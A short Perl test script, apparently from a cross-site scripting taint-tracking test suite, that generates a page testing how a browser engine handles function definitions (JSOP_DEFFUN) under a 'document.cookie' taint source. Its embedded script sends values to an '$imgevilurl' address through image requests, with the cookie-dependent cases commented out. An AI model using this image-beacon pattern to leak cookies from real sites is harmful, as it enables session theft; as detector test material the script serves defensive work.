#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_DEFFUN";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil 
		var notevil = 42;
		function testfunc() {
		}		
		var url = "$imgevilurl?normal=" + testfunc;
		document.images[0].src = url;
		
/*		// are JSOP_CLOSURES
		// if with evil val 
		if ($evil)  {
			function testfunc2() {
			}
		}
		var url2 = "$imgevilurl?if=" + testfunc2;
		document.images[1].src = url2;
		
		// normal usage 
		if ($evil)  {
			function testfunc3() {
			}
		}
		var url3 = "$imgevilurl?isevil=" + testfunc3;
		document.images[2].src = url3;
*/		
    </script>
|;

require "xss_basic_footer.pl";